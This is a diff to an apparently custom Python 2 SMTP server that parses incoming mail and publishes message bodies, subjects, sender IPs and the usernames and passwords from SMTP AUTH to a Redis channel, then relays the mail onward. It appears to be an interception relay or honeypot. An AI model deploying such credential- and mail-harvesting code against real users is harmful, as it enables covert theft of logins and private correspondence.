@@ -6,6 +6,8 @@ import time
 import os
 import inspect
 import socket
+import email
+from quopri import decodestring
 
 from OpenSSL import SSL
 
@@ -37,27 +39,51 @@ class JJMessage(object):
 		self.mailClient = ''
 
 	def lineReceived(self, line):
-		if line.find('X-Mailer:') >= 0:
-			split = line.split('X-Mailer:')
-			if len(split) == 2:
-				self.mailClient = split[1]
+		mailClient = self.getHeaderByKey(line, 'X-Mailer')
+		if mailClient is not None:
+			self.mailClient = mailClient
+
+		subject = self.getHeaderByKey(line, 'Subject')
+		if subject is not None:
+			self.subject = subject
 
 		self.lines.append(line)
+
+	def getHeaderByKey(self, line, headerKey):
+		headerKey += ': '
+		if line.find(headerKey) >= 0:
+			split = line.split(headerKey)
+			if len(split) == 2:
+				return split[1]
+		return None
+
+	def getMessageBody(self, rawInput):
+		body = email.message_from_string(rawInput)
+		for part in body.walk():
+			print part.get_content_type()
+			if part.get_content_type() == 'text/plain':
+				val = str(decodestring(part.get_payload()))
+				return val.decode(part.get_content_charset(), 'ignore')
+		return ''
 
 	def eomReceived(self):
 		print "New messsage received."
 		self.lines.append('')
-		messageData = '\n'.join(self.lines)
-		messageData = str(messageData)
+		messageDataLines = '\n'.join(self.lines)
+		rawMessageData = str(messageDataLines)
+		mailBody = self.getMessageBody(rawMessageData)
+
+
 		# Publish mail to redis
 		d = {}
 		d['from'] = str(self.protocol.origin)
-		d['to'] = str(self.protocol.origin)
-		d['message'] = messageData
+		d['to'] = str(self.recipient)
+		d['message'] = mailBody
 		d['date'] = int(time.time() * 1000)
-		d['ip'] = self.protocol.remoteHostIp
+		d['IP'] = self.protocol.remoteHostIp
 		d['hostname'] = self.protocol.remoteHostname
 		d['mailclient'] = self.mailClient
+		d['subject'] = self.subject
 		
 		try:
 			smtpRedisClient.publish('new:mail', json.dumps(d))
@@ -67,7 +93,7 @@ class JJMessage(object):
 
 		print 'REALLY SENDING THE MAIL'
 
-		msg = StringIO(messageData)
+		msg = StringIO(rawMessageData)
 		self.msgIO = msg
 		self.realMailTransfer()
 		
@@ -176,7 +202,7 @@ class JJESMTP(smtp.ESMTP):
 			c['date'] = int(time.time() * 1000)
 			c['username'] 	= self.username
 			c['password'] 	= self.password
-			c['ip'] 		= self.remoteHostIp
+			c['IP'] 		= self.remoteHostIp
 			c['hostname']	= self.remoteHostname
 
 			try:
@@ -213,8 +239,6 @@ class JJSMTPFactory(smtp.SMTPFactory):
 		#
 
 		proto = smtp.SMTPFactory.buildProtocol(self, addr)
-		proto.destHost = destHost
-		proto.destPort = destPort
 
 		# AUTH challengers
 		proto.challengers = {"LOGIN": LOGINCredentials}
